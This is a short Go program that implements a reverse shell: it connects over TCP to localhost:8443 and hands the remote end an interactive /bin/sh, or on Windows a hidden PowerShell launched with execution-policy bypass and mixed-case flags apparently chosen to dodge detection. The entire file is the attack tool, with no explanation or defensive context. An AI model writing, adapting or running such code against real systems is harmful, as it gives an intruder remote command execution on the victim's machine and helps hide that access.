package main

import (
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
)

func handle(src net.Conn) {
	defer src.Close()

	var cmd = exec.Command("/bin/sh", "-i")

	if runtime.GOOS == "windows" {
		cmd = exec.Command("PowErShELl.exe", "-nOPrOFilE", "-W", "hIdDen", "-EXeC", "bYpAsS")
	}

	r, w := io.Pipe()
	cmd.Stdin = src
	cmd.Stdout = w
	go io.Copy(src, r)
	cmd.Run()
}

func main() {
	connect, err := net.Dial("tcp", "localhost:8443")
	if err != nil {
		log.Fatalln("Failed to connect.")
	}
	handle(connect)
}
